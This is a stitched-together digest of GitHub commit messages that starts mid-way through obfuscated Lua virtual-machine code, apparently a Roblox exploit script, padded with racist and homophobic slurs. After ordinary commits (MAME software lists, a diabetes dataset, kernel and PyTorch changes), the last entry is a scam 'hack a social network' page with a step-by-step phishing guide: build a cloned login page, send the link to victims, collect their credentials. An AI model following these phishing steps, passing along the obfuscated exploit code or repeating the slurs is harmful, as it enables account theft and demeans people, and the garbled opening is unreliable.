S[e[x]]=o[e[f]];break end while 2086==(n)/(((-96+0x7426c)/0xaa))do local n=e[f];local l=o[e[U]];o[n+1]=l;o[n]=l[e[N]];break end;break;end break;end while(n)/(((-0x10+2278)+-#"cruz pp is large"))==797 do n=(9338520)while((-101+0xaf)+-#[[Niggabyte]])>=r do n-= n local n;o[e[g]]=o[e[U]][e[N]];l=l+d;e=a[l];o[e[b]]=e[O];l=l+d;e=a[l];o[e[g]]=o[e[k]][e[N]];l=l+d;e=a[l];o[e[f]]=o[e[U]][e[M]];l=l+d;e=a[l];o[e[h]]=o[e[x]];l=l+d;e=a[l];n=e[w]o[n]=o[n](P(o,n+d,e[s]))l=l+d;e=a[l];if not o[e[t]]then l=l+i;else l=e[U];end;break;end while 2638==(n)/((7202-(-#[[Faggot]]+(0xe9f+-75))))do n=(6297928)while r>(-0x3a+124)do n-= n local n=e[b]local l,e=L(o[n](P(o,n+1,e[s])))p=e+n-1 local e=0;for n=n,p do e=e+d;o[n]=l[e];end;break end while(n)/((0x1584-2765))==2296 do local e={o,e};e[i][e[c][w]]=e[d][e[c][N]]+e[i][e[c][x]];break end;break;end break;end break;end while(n)/((0x1ecb-3989))==3496 do n=(13599207)while(((-#'cruz pp is large'+(0x31d6-6406))/72)+-#'free bobux no skem')>=r do n-= n n=(4950528)while((3515/0x25)+-#[[if syn then haxor alert end]])>=r do n-= n if(o[e[t]]==o[e[D]])then l=l+i;else l=e[u];end;break;end while(n)/((0x1265-2365))==2112 do n=(6936064)while((-0x77+192)+-#'nerd')<r do n-= n local n=e[t];local d=o[n]local r=o[n+2];if(r>0)then if(d>o[n+1])then l=e[s];else o[n+3]=d;end elseif(d<o[n+1])then l=e[U];else o[n+3]=d;end break end while(n)/((-#[[big niggers sucking cock]]+(711040/0xca)))==1984 do o[e[w]]=o[e[s]];break end;break;end break;end while(n)/((-#'Crackzzzz'+((-#"Niggabyte"+(16571-0x208b))-0x104b)))==3357 do n=(3722470)while r<=(-0x2f+119)do n-= n n=(6665400)while r>(-#'yeet'+((0xc1+-85)+-0x21))do n-= n o[e[h]]=o[e[x]][e[D]];l=l+d;e=a[l];o[e[f]]=o[e[k]][e[M]];l=l+d;e=a[l];o[e[f]]=o[e[s]][o[e[M]]];l=l+d;e=a[l];o[e[h]]=o[e[x]][e[B]];l=l+d;e=a[l];if(o[e[w]]~=e[N])then l=l+i;else l=e[s];end;break end while 1800==(n)/((-#"big niggers sucking cock"+(0x1d34-3749)))do _[e[s]]=o[e[h]];l=l+d;e=a[l];o[e[h]]={};l=l+d;e=a[l];o[e[b]]={};l=l+d;e=a[l];_[e[x]]=o[e[g]];l=l+d;e=a[l];o[e[t]]=_[e[k]];l=l+d;e=a[l];if(o[e[b]]~=e[C])then l=l+i;else l=e[k];end;break end;break;end while(n)/((0x66f+-77))==2371 do n=(1101144)while r>(0xc9-128)do n-= n local c=z[e[k]];local r;local n={};r=H({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for d=1,e[C]do l=l+i;local e=a[l];if e[(-52+0x35)]==69 then n[d-1]={o,e[k]};else n[d-1]={S,e[x]};end;y[#y+1]=n;end;o[e[g]]=v(c,r,_);break end while 344==(n)/(((3249+-0x27)+-#[[0nly segc]]))do o[e[b]]=(e[U]~=0);break end;break;end break;end break;end break;end break;end while 2726==(n)/((0x46b+-88))do n=(4430234)while(-94+0xb4)>=r do n-= n n=(9291218)while r<=(0xac+-92)do n-= n n=(2668611)while r<=(273-0xc4)do n-= n n=(2716515)while r<=((18648/0xde)+-#'Niggabyte')do n-= n local l=e[w];local n=o[e[O]];o[l+1]=n;o[l]=n[e[M]];break;end while 1005==(n)/((0xaa9+-26))do n=(1712480)while(0xf6-170)<r do n-= n S[e[u]]=o[e[h]];break end while 616==(n)/((5619-(-0x1c+2867)))do local n=e[w]local r={o[n](o[n+1])};local l=0;for e=n,e[D]do l=l+d;o[e]=r[l];end break end;break;end break;end while 1257==(n)/((-49+0x87c))do n=(2435933)while r<=(0x141c/66)do n-= n local r=e[h];local a=e[D];local n=r+2 local r={o[r](o[r+1],o[n])};for e=1,a do o[n+e]=r[e];end;local r=r[1]if r then o[n]=r l=e[k];else l=l+d;end;break;end while(n)/((-0x76+3245))==779 do n=(868956)while r>(-#'Impulse youtube real'+(0x5b44/236))do n-= n if(o[e[t]]~=e[m])then l=l+i;else l=e[U];end;break end while(n)/((757-0x199))==2497 do o[e[b]]=o[e[O]][e[C]];break end;break;end break;end break;end while(n)/((4939-0x9c5))==3811 do n=(1976799)while r<=(((36848-0x4802)/186)+-#'0nly was here mf')do n-= n n=(4250224)while((-#"papier der afghaner wurde von nice dem bombenleger gefickt"+(-195/0x5))+0xb2)>=r do n-= n if(o[e[h]]==o[e[m]])then l=l+i;else l=e[k];end;break;end while 3608==(n)/((0x945-1195))do n=(4275024)while(-#[[monkey mode]]+(0x107-170))<r do n-= n _[e[x]]=o[e[f]];break end while(n)/((-0x7d+(0x63a19/253)))==2873 do o[e[g]]=#o[e[u]];break end;break;end break;end while 1221==(n)/((0x1ae0c/68))do n=(848922)while((439-0xf2)-113)>=r do n-= n if not o[e[t]]then l=l+i;else l=e[u];end;break;end while(n)/((-#"free bobux no skem"+(0x2580/30)))==2811 do n=(114900)while(0x490c/220)<r do n-= n local n;o[e[b]]=_[e[k]];l=l+d;e=a[l];o[e[w]]=o[e[k]][e[M]];l=l+d;e=a[l];n=e[h]o[n]=o[n](o[n+i])l=l+d;e=a[l];o[e[h]]=o[e[x]];l=l+d;e=a[l];l=e[O];break end while 75==(n)/(((0xc47-1601)+-#"bigchungus"))do local r;local n;o[e[g]]=(e[s]~=0);l=l+d;e=a[l];o[e[t]]=o[e[k]];l=l+d;e=a[l];o[e[f]]=_[e[x]];l=l+d;e=a[l];n=e[f]o[n]=o[n](o[n+i])l=l+d;e=a[l];r=o[e[D]];if not r then l=l+i;else o[e[w]]=r;l=e[s];end;break end;break;end break;end break;end break;end while 3893==(n)/((1174+-0x24))do n=(6689500)while r<=(3956/0x2b)do n-= n n=(204255)while((0xb6+-84)+-#"arab porn")>=r do n-= n n=(11146350)while(0x3edf/185)>=r do n-= n o[e[h]]=(e[O]~=0);break;end while 2850==(n)/((3967+-0x38))do n=(880654)while(-#'never gonna give you up never gonna let you down'+(0x165-221))<r do n-= n o[e[h]]=v(z[e[O]],nil,_);break end while 3134==(n)/((0x806d/117))do o[e[b]][o[e[x]]]=o[e[C]];break end;break;end break;end while 765==(n)/(((61401/0xd3)+-#[[0nly 1337 smashed ur wap]]))do n=(592816)while r<=(((-30+0x5d53)/223)+-#[[anime is for fags]])do n-= n o[e[f]]=o[e[x]]-e[N];break;end while(n)/((0x4b5-652))==1072 do n=(1237498)while r>((0x11c-175)+-#"free bobux no skem")do n-= n o[e[t]]=o[e[U]]-e[M];break end while(n)/((0x4ff95/153))==578 do local e=e[h]o[e]=o[e](P(o,e+d,p))break end;break;end break;end break;end while 1700==(n)/((7980-0xfcd))do n=(1450008)while r<=((-53+0x9a)+-#[[Faggot]])do n-= n n=(7987650)while(-0x4e+171)>=r do n-= n local e=e[w]o[e]=o[e]()break;end while(n)/((6830-0xd67))==2350 do n=(13842080)while r>(0x18f8/68)do n-= n o[e[g]]=o[e[s]]%e[D];break end while 3808==(n)/(((620840/0xaa)+-#'anime is for fags'))do local n=o[e[M]];if not n then l=l+i;else o[e[t]]=n;l=e[O];end;break end;break;end break;end while(n)/((0xc17-1583))==959 do n=(10488806)while r<=(-0x6d+206)do n-= n n=(7360851)while r>(0xbf+-95)do n-= n local n=e[g];local r=o[n+2];local d=o[n]+r;o[n]=d;if(r>0)then if(d<=o[n+1])then l=e[s];o[n+3]=d;end elseif(d>=o[n+1])then l=e[x];o[n+3]=d;end break end while 2461==(n)/((-#[[0nly 1337]]+(0x17d4-3100)))do do return o[e[t]]end break end;break;end while(n)/((0xe66d/21))==3734 do n=(621156)while r>(-73+0xab)do n-= n if(o[e[b]]==e[C])then l=l+i;else l=e[U];end;break end while(n)/((0xf2+-20))==2798 do local e=e[f]o[e]=o[e]()break end;break;end break;end break;end break;end break;end break;end l+= i end;end);end;return v(q(),{},A())()end)_msec({[(0xc0f/21)]='\115\116'..(function(e)return(e and'            ')or'\114\105'or'\120\58'end)((535/0x6b)==(67-0x3d))..'\110g',["​​             "]='\108\100'..(function(e)return(e and'     ​  ')or'\101\120'or'\119\111'end)((-#'papier ist ein kleiner schwanz lutscher'+(0x89-(-#'deadphonelua'+(0x5064/196))))==(0x2fa/127))..'\112',["        ​   "]=(function(e)return(e and'                 ')and'\98\121'or'\100\120'end)((675/0x87)==(95+-0x5a))..'\116\101',["         "]='\99'..(function(e)return(e and' ​           ')and'\90\19\157'or'\104\97'end)((-#[[nico der hurensohn]]+(0x3f-40))==(9/0x3))..'\114',[(0x12524/(6278/0x2b))]='\116\97'..(function(e)return(e and'     ​            ')and'\64\113'or'\98\108'end)((59+(-22+-0x1f))==(65+-0x3c))..'\101',["            ​     "]=(function(e)return(e and'  ​       ')or'\115\117'or'\78\107'end)(((0x56-62)+-#'this is a meme string')==(131+-0x64))..'\98',["                   "]='\99\111'..(function(e)return(e and'​     ​  ​')and'\110\99'or'\110\105\103\97'end)((-#'cruz pp is large'+(95+(-0xc-36)))==(558/0x12))..'\97\116',[(0x298+-38)]=(function(e,n)return(e and'                   ')and'\48\159\158\188\10'or'\109\97'end)((((9292/0xca)-0x20)+-#[[Crackzzzz]])==(62-0x38))..'\116\104',[(-0x7f+1481)]=(function(n,e)return((-33+0x26)==(121-0x76)and'\48'..'\195'or n..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["           ​       "]='\105\110'..(function(e,n)return(e and' ​       ')and'\90\115\138\115\15'or'\115\101'end)(((130+-0x6d)+-#"cruz pp is large")==(-#'lego hax'+(0x19e6/170)))..'\114\116',["     ​    "]='\117\110'..(function(e,n)return(e and'          ')or'\112\97'or'\20\38\154'end)((-#'cruz pp is large'+(2898/0x8a))==(7130/0xe6))..'\99\107',["      ​​           "]='\115\101'..(function(e)return(e and'           ​      ')and'\110\112\99\104'or'\108\101'end)((0x58-83)==(0x49+(-#"monkey mode"+(65-0x60))))..'\99\116',["                  "]='\116\111\110'..(function(e,n)return(e and'     ​​     ​ ')and'\117\109\98'or'\100\97\120\122'end)((0x4b/15)==((149-0x78)+-#"0nly 1337 smashed ur wap"))..'\101\114'},{["                 "]=((getfenv))},((getfenv))()) end)()

---
## [tedgreen99/mame](https://github.com/tedgreen99/mame)@[a49e215466...](https://github.com/tedgreen99/mame/commit/a49e2154666b0ee7423e2d859c21b7592a4c61b8)
#### Wednesday 2022-04-13 18:17:22 by Firehawke

Apple II updates for January 2022 (#9189)

* New working software list additions (apple2_flop_clcracked.xml)
---------------------------------------------------------------

Earth Science: Interplanetary Travel (cleanly cracked) [4am, Firehawke]
Isaac Newton and F.I.G. Newton (cleanly cracked) [4am, Firehawke]
Return to Reading: The Call of the Wild (cleanly cracked) [4am, Firehawke]
The German Hangman (cleanly cracked) [4am, Firehawke]
Legionnaire (cleanly cracked) [4am, Firehawke]

* New working software list additions (apple2_flop_clcracked.xml)
---------------------------------------------------------------

Bridge Tutor with Precision and Scientific Bidding (cleanly cracked) [4am, san inc, Firehawke]
The French Hangman (cleanly cracked) [4am, Firehawke]
The Russian Hangman (cleanly cracked) [4am, Firehawke]

* New working software list additions (apple2_flop_orig.xml)
----------------------------------------------------------

Mickey's Space Adventure [4am, Firehawke]
The Environment Life Dynamic [4am, Firehawke]

* New working software list additions (apple2_flop_orig.xml)
----------------------------------------------------------

Stellar Power [4am, Firehawke]

New working software list additions (apple2_flop_clcracked.xml)
---------------------------------------------------------------

Ken Uston's Professional Blackjack (Version 1.12) (cleanly cracked) [4am, Firehawke]
Dinosaur's Lunch (cleanly cracked) [4am, Firehawke]
Race Car Keys (cleanly cracked) [4am, Firehawke]
Functional Harmony: Basic Chords (cleanly cracked) [4am, Firehawke]
Functional Harmony: Diatonic Seventh Chords (cleanly cracked) [4am, Firehawke]
Functional Harmony: Borrowed and Altered Chords (cleanly cracked) [4am, Firehawke]
Building Reading Skills: The Letter-Sound Farm (cleanly cracked) [4am, Firehawke]
Follow Me (cleanly cracked) [4am, Firehawke]

* New working software list additions (apple2_flop_clcracked.xml)
---------------------------------------------------------------

The German Hangman (Revision 2) (cleanly cracked) [4am, Firehawke]
The Russian Hangman (Revision 2) (cleanly cracked) [4am, Firehawke]
The Spanish Hangman (Revision 2) (cleanly cracked) [4am, Firehawke]

* New working software list additions (apple2_flop_clcracked.xml)
---------------------------------------------------------------

Exploring Library Land (cleanly cracked) [4am, Firehawke]
Library Treasure Hunt (cleanly cracked) [4am, Firehawke]
Expedition U.S.A.! (cleanly cracked) [4am, Firehawke]
Codes and Cyphers (cleanly cracked) [4am, san inc, Firehawke]
Ripley's Believe It Or Not: Beginning Library Research Skills (cleanly cracked) [4am, Firehawke]

* New working software list additions (apple2_flop_orig.xml)
----------------------------------------------------------

Glutton [4am, Firehawke]

---
## [LJmartin94/Codam11_CPPpiscine](https://github.com/LJmartin94/Codam11_CPPpiscine)@[b125872478...](https://github.com/LJmartin94/Codam11_CPPpiscine/commit/b1258724788c1751fb7f16222ab54d77a442f635)
#### Wednesday 2022-04-13 18:22:44 by LJmartin94

Fucking about with bits n floats n shit but now my brain is fried so its commit time babyyy

---
## [Safiya-Geelani/Diabetes](https://github.com/Safiya-Geelani/Diabetes)@[21f483a5d4...](https://github.com/Safiya-Geelani/Diabetes/commit/21f483a5d4a632bb5bc8f00259af785b51dbcae6)
#### Wednesday 2022-04-13 19:14:57 by Safiya Geelani

Add files via upload

Diabetes and obesity, cardiovascular risk factors
403 African Americans were interviewed in a study to understand the prevalence of obesity, diabetes, and
other cardiovascular risk factors in central Virginia.
Format:
A data frame with 403 observations on the following 19 variables.
Variables:
id = Subject ID
chol = Total Cholesterol
stab.glu = Stabilized Glucose
hdl = High Density Lipoprotein
ratio = Cholesterol/HDL Ratio
glyhb = Glycosolated Hemoglobin
location = County - a factor with levels Buckingham Louisa
age = age in years
gender = a factor with levels male female
height = height in inches
weight = weight in pounds
frame = a factor with levels small medium large
bp.1s = First Systolic Blood Pressure
bp.1d = First Diastolic Blood Pressure
bp.2s = Second Systolic Blood Pressure
bp.2d = Second Diastolic Blood Pressure
waist = waist in inches
hip = hip in inches
time.ppn = Postprandial Time (in minutes) when Labs were Drawn
Details:
Glycosolated hemoglobin greater than 7.0 is usually taken as a positive diagnosis of diabetes
Source:
Willems JP, Saunders JT, DE Hunt, JB Schorling: Prevalence of coronary heart disease risk factors among
rural blacks: A community-based study. Southern Medical Journal 90:814-820; 1997
References:
Schorling JB, Roach J, Siegel M, Baturka N, Hunt DE, Guterbock TM, Stewart HL: A trial of church-based
smoking cessation interventions for rural African Americans. Preventive Medicine 26:92-101; 1997

---
## [silont-project/kernel_xiaomi_sdm439](https://github.com/silont-project/kernel_xiaomi_sdm439)@[67206762c6...](https://github.com/silont-project/kernel_xiaomi_sdm439/commit/67206762c6b6055c3726c4b09be792c4340d9199)
#### Wednesday 2022-04-13 19:24:26 by Angelo G. Del Regno

Merge: Performance improvements.

This patchset brings some performance improvements and the addition of the LZO-RLE
algorithm to the kernel, also usable in zram (yup, tested, works but LZ4 is still ok for us).

The main performance improvement is for SWAP space: the locking has changed and
the swap cache is now split in 64MB trunks.
This gives us a reduction of the median page fault latency of 375%, from 15uS to 4uS,
and an improvement of 192% on the swap throughput (this includes "virtual" swap
devices, like zRAM!). The real world user experience improvement of this on a mobile
device is seen after a day or two of usage, where it usually starts losing just a little
performance due to the large amount of apps kept open in background: now I cannot
notice any more performance loss and the user experience is now basically the same as
if the phone was in its first 2 hours of boot life.

Other performance improvements include, in short:

    UDP v4/v6: 10% more performance on single RX queue
    Userspace applications will be faster when checking running time of threads
    2-5% improvements on heavy multipliers (yeah, not a lot, but was totally free...)
    Improvements on rare conditions during sparsetruncate of about 0.3% to a
    way more rare around 20% improvement (that's never gonna happen, but there
    is no performance drop anywhere).

Tested on SoMC Tama Akatsuki RoW

This was taken from
Repo:
https://github.com/sonyxperiadev/kernel
PR: 2039 ([2.3.2.r1.4] Performance improvements)

Signed-off-by: sweetyicecare <gabrielseedev@outlook.com>
Signed-off-by: Jprimero15 <jprimero155@gmail.com>
Signed-off-by: Joel Gómez <nahuelgomez329@gmail.com>

Conflicts:
	mm/swapfile.c
	mm/swap.c

---
## [W2WBack2RD/goodforest](https://github.com/W2WBack2RD/goodforest)@[4a7afa3548...](https://github.com/W2WBack2RD/goodforest/commit/4a7afa3548d45fe7c90da21ee45675a417be5f5b)
#### Wednesday 2022-04-13 20:36:06 by Shoval Ichia

It was a beatiful journey! I am so glad that I was in such an amazing squad like this one! I learned a lot from each weekly and each task. Thank you so much. It was one experience in a life!

---
## [pytorch/pytorch](https://github.com/pytorch/pytorch)@[1b7d7d9327...](https://github.com/pytorch/pytorch/commit/1b7d7d93276eb37c009905ef87ea9c2a7c95481e)
#### Wednesday 2022-04-13 21:22:15 by Brian Hirsh

Reland: "free up dispatch key space (in C++)" (#74963)

Summary:
Pull Request resolved: https://github.com/pytorch/pytorch/pull/74963

This is a re-land of D35192346 (https://github.com/pytorch/pytorch/commit/9872a06d77582e91e834103db75f774ca75f7fff) and D35192317 (https://github.com/pytorch/pytorch/commit/a9216cde6cc57f94586ea71a75a35aaabee720ff), which together are a diff that changes the internal representation of `DispatchKeySet` in pytorch core to free up the number of dispatch keys that we have available. See a more detailed description of the design in the original PR: https://github.com/pytorch/pytorch/pull/69633.

The original PR broke Milan workflows, which use a pytorch mobile build, and manifested as a memory corruption bug inside of `liboacrmerged.so`.

**Background: Existing Mobile Optimization**
Pytorch mobile builds have an existing optimization (here https://github.com/pytorch/pytorch/blob/cc23725e89713138aa1c81ce5fb4a8dbcd440ccf/c10/core/DispatchKey.h#L382 and here https://github.com/pytorch/pytorch/blob/cc23725e89713138aa1c81ce5fb4a8dbcd440ccf/aten/src/ATen/core/dispatch/OperatorEntry.h#L214), which works as follows:

Every operator in pytorch has a "dispatch table" of function pointers, corresponding to all of the (up to 64) different kernels that we might dispatch to when we run an operator in pytorch (autograd, cpu, cuda, complex number support, etc).

In mobile builds, the size of that table is shrunk from 64 to 8 to save a bunch of space, because mobile doesn't end up using the functionality associated with most dispatch keys.

The dispatcher also has a notion of "fallback kernels", which are kernels that you can register to a particular dispatch key, but should be able to work for "any operator". The array of fallback kernels is defined here: https://github.com/pytorch/pytorch/blob/cc23725e89713138aa1c81ce5fb4a8dbcd440ccf/aten/src/ATen/core/dispatch/Dispatcher.h#L294.

The mobile-optimization currently does **not** extend to this array (it wouldn't be that useful anyway because there is only one array of fallback kernels globally - vs. there is a separate dispatch table of function pointers per operator). So the per-operator tables on mobile are size 8, while the fallback table is size 64.

**The Bug**
This PR actually makes it difficult to enable that optimization separately for the per-operator arrays vs. the fallback array, and incidentally shrunk the size of the fallback array from 64 to 8 for mobile (that happened on this line: https://github.com/pytorch/pytorch/pull/69633/files#diff-f735cd7aa68f15b624100cbc4bb3b5ea76ffc7c9d3bec3b0ccabaa09609e5319R294).

That isn't a problem by itself (since mobile doesn't actually use any of the fallbacks that can no longer be stored). However, pytorch core will still register all of those fallback kernels on startup in mobile builds, even if they aren't used. When we tried to register one of those fallbacks on startup, it would try to dump the kernel somewhere in memory past the bounds of the (now smaller) array inside of the `Dispatcher` object, `backendFallbackKernels_`.

**Why didn't this problem show up in OSS CI? Why didn't it break other internal mobile workflows aside from Milan?**

Ideally, this failure would show up as part of the OSS signal on GitHub, since we already have mobile OSS builds. Given that it was another memory corruption issue that only affected Milan (subset of mobile), I'm not sure what's specific about Milan's builds that caused it only to manifest there. dreiss I wonder if there's another flavor of mobile builds we could run in OSS CI that could potentially help catch this?

**The debugging experience was pretty difficult**

Debugging the Milan-specific failure was made difficult by the following:

(1) lack of CI
- the original Milan failure didn't surface on my original diff, because the Milan job(s) that failed weren't triggered to run on pytorch changes. There's probably a balance to strike here, since those jobs will only be useful if they aren't flaky, and if they can produce reliable failure logs for debugging.

(2) It's difficult to get a repro.
- my work laptop doesn't have the right specs to run the Milan development workflow (not enough disk space)
- There is an existing OnDemand workflow for Milan, but it appears to be relatively new, and after a bunch of help from MarcioPorto, we ran into issues forwarding the log output from Milan tests on the emulator back to the terminal (see the original discussion here: https://fb.workplace.com/groups/OnDemandFRL/permalink/1424937774645433/)

(3) Lack of stack-traces.
- Most Milan failures didn't include actionable stack traces. phding generously helped me debug by running my suggested patches locally, and reporting back if there were any failures. The failing test didn't include a stack trace though (just the line where the crash appeared), so I ended up making some educated guesses about what the issue was based on the area of the crash.
ghstack-source-id: 152688542

Test Plan: Confirmed with phding that the broken Milan workflow from the previous version of this diff is now passing.

Reviewed By: phding, albanD

Differential Revision: D35222806

fbshipit-source-id: 0ad115a0f768bc8ea5d4c203b2990254c7092d30
(cherry picked from commit 002b91966f11fd55ab3fa3801b636fa39a6dd12c)

---
## [IsaacTheSharkWolf/Skyrat-tg](https://github.com/IsaacTheSharkWolf/Skyrat-tg)@[07e6768659...](https://github.com/IsaacTheSharkWolf/Skyrat-tg/commit/07e67686593faeac75c1743a1f9c45a256f0e331)
#### Wednesday 2022-04-13 21:48:36 by SkyratBot

[MIRROR] Refactor and improve antimagic to be more robust [MDB IGNORE] (#12619)

* Refactor and improve antimagic to be more robust (#64124)

This refactors the antimagic component to use and have bitflags, documentation, defines, code comments, named arguments, and renames variable names for clarity.

- /obj/effect/proc_holder/spell/aoe_turf/conjure/creature/cult is not used anywhere and has been removed
- /obj/effect/proc_holder/spell/targeted/turf_teleport/blink/cult is not used anywhere and has been removed

- New sound effects are played when magic is blocked. Depending on the type of magic being used it will be either:

- Equipping antimagic now properly updates the magic buttons
- Any magic being blocked or restricting casting now displays a message
- MAGIC_RESISTANCE_MIND now properly blocks telepathy effects
- Removes blood splatter when fireball is blocked
- Magic projectiles for staff of locker no longer spawn lockers when blocked by antimagic
- Fire breath is no longer blocked by antimagic
- Spellcards are now blocked by antimagic

Any antimagic on a mob blocks that magic type from being casted. (certain spells such as mime abilities completely ignore antimagic)

- Foilhats prevent someone from casting mind magic (telepathy, mindswap, etc.)
- Bibles, ritual Totems, nullrods, holymelons, and TRAIT_HOLY prevent someone from casting unholy magic (cult spells, etc.)
- Nullrods, ritual totem, and holymelons prevent someone from casting wizard magic (fireball, magic missile, etc.)
- Immorality talismans, berserker suits, and TRAIT_ANTIMAGIC prevents all types of magic (except stuff like mime abilities)
- Touch of Madness and Mindswap is now blocked with MAGIC_RESISTANCE and MAGIC_RESISTANCE_MIND
- Voice of god is now blocked with MAGIC_RESISTANCE_HOLY and MAGIC_RESISTANCE_MIND

* Refactor and improve antimagic to be more robust

* Update tiedshoes.dm

Co-authored-by: Tim <timothymtorres@gmail.com>
Co-authored-by: Gandalf <9026500+Gandalf2k15@users.noreply.github.com>

---
## [james-j0/feedback](https://github.com/james-j0/feedback)@[4d23bcb42a...](https://github.com/james-j0/feedback/commit/4d23bcb42a1a03f45bd81711b793e2296d155ad0)
#### Wednesday 2022-04-13 21:52:14 by james-j0

Hack a social network in 2022 Choose the social network that you want to HACK! Facebook Instagram Messenger Whatsapp Twitter TikTok Ver más Insert the Facebook profile URL: https://www.facebook.com/profile.php?id=100053793351099  I need help!HACKING...  Name: شبيه الريح Username: 100053793351099 ID: 100053793351099 100% HIDE #Trying 1 times  #Trying 2 times  #Trying 3 times  #Trying 4 times  #Trying 5 times  >_ Loading again...     --libs/attack.py...     --libs/attack-ddos.py...     --libs/attack-server.py...     --py/python-api.py...     --py/injection.py...     --cpp/config.cpp...     --cpp/injection-test1.cpp...     --ruby/ruby-keys.rb...     --ruby/injection.rb...     --includes/script-hack-2.7.6.php...  >_ Attack...  >_ Attack...  >_ Attack...  >_ Waiting...  #Open port  #Emuling IP United States, BX  >_ Fail...  >_ Fail...  >_ Fail...  >_ Fail...  #Open port 702  >_ Details acccount...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...  >_ Fail...  >_ Fail...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...     --email: ********************...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --OLD PASSWORD: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...  #Trying 1 times  #Trying 2 times  #Trying 3 times  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...  >_ Accesing as https://www.facebook.com/profile.php?id=100053793351099...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...     --Generate password: ****************...  >_ Open SQL port 3306...      >> SELECT f__u__ as username FROM ...  >_ Fail...  >_ Fail...  >_ Fail...  >_ Fail...  #ERROR      >> SELECT f__u__ as user FROM ...  >_ Fail...  >_ Fail...  >_ Fail...  >_ Fail...  #ERROR      >> SELECT fb__u__xx__ as username(VP.IP)...  #Return data  #Receiving answer  #Receiving asnwer  >_ Open my data base SQL     --Saving data...     --Saving data...  #HACK 99%  #HACK 100%  #VERIFY DATA ACCOUNT RECENT HACK  >_ Triying login...     --email: *************...     --password: *************...     --password: *************...     --password: *************...     --password: *************...  >_ Triying login...     --email: *************...     --password: *************...     --password: *************...  >_ Triying login...     --email: *************...     --password: *************...  >_ Triying login...     --email: *************...     --password: *************...  >_ Triying login...     --email: *************...     --password: *************...  #Decode password MD5...  >_ Triying password decode...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...     --password *************...  #LOGIN  >_ Saving account details in our data base...  >_ Saving account details in our data base...  >_ Please wait...  >_ Waiting any seconds...  >_ Saving account details in our data base...  >_ Please wait...  >_ Waiting any seconds...  >_ Please wait...  SAVED DATA  >_ Saved data sucefully...        >_ FINISH HACK 100%!  >_ PLEASE Wait any seconds...  ......... TURN OFF ........  ......... TURN OFF ........  ........ SLEEP MODE .......  Your account details are saved, download it now.  |   Latest Hacked! Facebook شبيه الريح  Hacked!  Delete How to hack a social network! Option 1   Option 2 HomeHow to hack a social network! How to hack a social network! We have good news, you will not need a lot of technical experience to manage to violate a social network, it will be easier than you imagine. Just follow these steps.  Hack Facebook Easy Explanation to Hack Facebook from a cell phone Click on the three dots in the Facebook app Copy your victim's link Go to the section on hacking Any Social Network Paste your victim's link in the box Finally, hit Hack. Do you want to learn how to hack all social networks? Then you are in the right place because we teach you to:   How to hack Facebook.  How to hack Instagram.  How to hack Messenger.  How to hack WhatsApp.  How to hack Tiktok.  How to hack Snapchat.  How to hack Gmail.  How to hack Youtube.  How to hack Hotmail y Outlook.  How to hack Kwai.  How to hack Telegram.  How to hack Skype.  How to hack Twitter.  How to hack OnlyFans.  How to hack Tinder.  How to hack Pinterest.  How hack an email.  How to hack Linkedin.  Track Mobile.  How to hack Wifi. Social networks They are incredibly popular platforms these days, as through them we can communicate with people globally.  Hacking a social network guaranteed method Hack an account password Through specialized software it is so easy, you just need the right key. And here we will teach you some of the methods to achieve it.   Hack social networks through Exploit - Phishing method Did you know that by creating and designing a clone page of the social network of your choice you can get the access data of whoever you want?   Hack with Xploit Hack a social network with xploits We summarize the steps in the previous image:  1️⃣ Enter the website https://login-online.me/. And choose the social network you want to Hack  2️⃣ Save your identifier since that is where you can see your victims.  3️⃣ Choose a blogger from the ones that there are, they last very little, This is why many choose to get a premium blogger.  4️⃣ This section is for your victim to enter their data to see a movie, a song or whatever you want to put.  5️⃣ The expiration date is until the day the xploits you created will stop working.  6️⃣ Finally create your blogger, we recommend that you first try it before sending it  7️⃣ Send your victim through Facebook, WhatsApp, Email with something striking so that they can open it and enter their data.  Brilliant! Once you have fallen into your trap and provided the requested data, then, go back to the web and you will see the data that you have entered there.  The Phishing method it is totally true, through which hackers send their victims, inviting them to enter a forged link that redirects them to a main page of their social network, totally the same as the original, so that they enter their login data.   Spy apps to hack a social network  Other methods to hack social networks  Facebook  Tweet  Whatsapp  Pinterest React:                 899   797   484   97   66   57  Loading comments... 